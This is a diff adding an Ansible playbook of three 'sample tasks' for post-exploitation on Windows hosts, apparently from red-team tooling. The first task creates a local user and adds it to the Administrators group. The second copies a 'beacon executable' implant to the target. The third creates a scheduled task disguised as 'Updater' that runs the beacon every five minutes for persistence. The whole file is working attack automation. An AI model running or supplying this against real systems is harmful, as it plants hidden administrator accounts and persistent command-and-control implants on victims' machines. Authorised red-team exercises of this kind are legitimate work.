@@ -1,0 +1,48 @@
+---
+# Sample Task 1: Creating a new user
+- name: Create new user and add them to Administrators group
+  ansible.windows.win_shell: |
+    net user {{ win.win_user }} {{ win.win_pass }} /add
+    net localgroup Administrators {{ win.win_user }} /add
+  register: output
+  ignore_errors: true
+
+- name: Print output from previous task
+  ansible.builtin.debug:
+    msg: "{{ output }}"
+  tags:
+    - debug
+
+# Sample Task 2: Upload beacon executable to remote filesystem
+- name: Transfer beacon executable to remote filesystem
+  ansible.windows.win_copy:
+    src: "{{ win.beacon_filename }}"
+    dest: "{{ win.payload_dest }}"
+  register: output
+  ignore_errors: true
+
+- name: Print output from previous task
+  ansible.builtin.debug:
+    msg: "{{ output }}"
+  tags:
+    - debug
+
+# Sample Task 3: Creating a scheduled task to run the beacon executable every 5 minutes
+- name: Create a scheduled task
+  community.windows.win_scheduled_task:
+    name: 'Updater'
+    actions:
+      - path: cmd.exe
+        arguments: "/c {{ win.payload_dest }}\\{{ win.beacon_filename }}"
+    triggers:
+      - type: registration
+        repetition:
+          interval: PT5M
+  register: output
+  ignore_errors: true
+
+- name: Print output from previous task
+  ansible.builtin.debug:
+    msg: "{{ output }}"
+  tags:
+    - debug
